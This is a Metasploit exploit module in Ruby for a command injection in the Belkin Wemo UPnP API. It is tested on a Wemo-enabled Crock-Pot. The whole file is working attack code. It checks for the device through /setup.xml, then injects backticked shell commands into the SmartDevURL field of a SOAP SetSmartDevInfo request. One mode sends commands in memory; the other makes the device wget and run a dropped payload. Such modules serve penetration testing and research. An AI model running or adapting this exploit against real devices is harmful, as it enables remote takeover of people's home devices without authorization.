# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;               => &#039;Belkin Wemo UPnP Remote Code Execution&#039;,
      &#039;Description&#039;        => %q{
        This module exploits a command injection in the Belkin Wemo UPnP API via
        the SmartDevURL argument to the SetSmartDevInfo action.

        This module has been tested on a Wemo-enabled Crock-Pot, but other Wemo
        devices are known to be affected, albeit on a different RPORT (49153).
      },
      &#039;Author&#039;             => [
        &#039;phikshun&#039;, # Discovery, UFuzz, and modules
        &#039;wvu&#039;       # Crock-Pot testing and module
      ],
      &#039;References&#039;         => [
        [&#039;URL&#039;, &#039;https://web.archive.org/web/20150901094849/http://disconnected.io/2014/04/04/universal-plug-and-fuzz/&#039;],
        [&#039;URL&#039;, &#039;https://github.com/phikshun/ufuzz&#039;],
        [&#039;URL&#039;, &#039;https://gist.github.com/phikshun/10900566&#039;],
        [&#039;URL&#039;, &#039;https://gist.github.com/phikshun/9984624&#039;],
        [&#039;URL&#039;, &#039;https://www.crock-pot.com/wemo-landing-page.html&#039;],
        [&#039;URL&#039;, &#039;https://www.belkin.com/us/support-article?articleNum=101177&#039;],
        [&#039;URL&#039;, &#039;http://www.wemo.com/&#039;]
      ],
      &#039;DisclosureDate&#039;     => &#039;2014-04-04&#039;,
      &#039;License&#039;            => MSF_LICENSE,
      &#039;Platform&#039;           => [&#039;unix&#039;, &#039;linux&#039;],
      &#039;Arch&#039;               => [ARCH_CMD, ARCH_MIPSLE],
      &#039;Privileged&#039;         => true,
      &#039;Targets&#039;            => [
        [&#039;Unix In-Memory&#039;,
          &#039;Platform&#039;       => &#039;unix&#039;,
          &#039;Arch&#039;           => ARCH_CMD,
          &#039;Type&#039;           => :unix_memory,
          &#039;DefaultOptions&#039; => {
            &#039;PAYLOAD&#039;      => &#039;cmd/unix/generic&#039;
          }
        ],
        [&#039;Linux Dropper&#039;,
          &#039;Platform&#039;       => &#039;linux&#039;,
          &#039;Arch&#039;           => ARCH_MIPSLE,
          &#039;Type&#039;           => :linux_dropper,
          &#039;DefaultOptions&#039; => {
          }
        ]
      ],
      &#039;DefaultTarget&#039;      => 1,
      &#039;Notes&#039;              => {
        &#039;Stability&#039;        => [CRASH_SAFE],
        &#039;SideEffects&#039;      => [ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      Opt::RPORT(49152)
    ])

    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;,  [true, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;Writable directory&#039;, &#039;/tmp&#039;])
    ])
  end

  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/setup.xml&#039;
    )

    if res && res.code == 200 && res.body.include?(&#039;urn:Belkin:device:&#039;)
      vprint_good(&#039;Wemo-enabled device detected&#039;)
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def exploit
    checkcode = check

    unless checkcode == CheckCode::Appears || datastore[&#039;ForceExploit&#039;]
      fail_with(Failure::NotVulnerable, &#039;Set ForceExploit to override&#039;)
    end

    case target[&#039;Type&#039;]
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
      cmdstager = generate_cmdstager(
        flavor:   &#039;wget&#039;,
        temp:     datastore[&#039;WritableDir&#039;],
        file:     File.basename(cmdstager_path),
        noconcat: true
      )

      # HACK: "chmod +x"
      cmdstager.unshift("cp /bin/sh #{cmdstager_path}")
      cmdstager.delete_if { |cmd| cmd.start_with?(&#039;chmod +x&#039;) }
      cmdstager = cmdstager.join(&#039;;&#039;)

      vprint_status("Regenerated command stager: #{cmdstager}")
      execute_command(cmdstager)
    end
  end

  def execute_command(cmd, opts = {})
    send_request_cgi(
      &#039;method&#039;       => &#039;POST&#039;,
      &#039;uri&#039;          => &#039;/upnp/control/basicevent1&#039;,
      &#039;ctype&#039;        => &#039;text/xml&#039;,
      &#039;headers&#039;      => {
        &#039;SOAPACTION&#039; => &#039;"urn:Belkin:service:basicevent:1#SetSmartDevInfo"&#039;
      },
      &#039;data&#039;         => generate_soap_xml(cmd)
    )
  end

  def generate_soap_xml(cmd)
    <<EOF
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:SetSmartDevInfo xmlns:u="urn:Belkin:service:basicevent:1">
      <SmartDevURL>`#{cmd}`</SmartDevURL>
    </u:SetSmartDevInfo>
  </s:Body>
</s:Envelope>
EOF
  end

  def cmdstager_path
    @cmdstager_path ||=
      "#{datastore[&#039;WritableDir&#039;]}/#{rand_text_alphanumeric(8..42)}"
  end

end

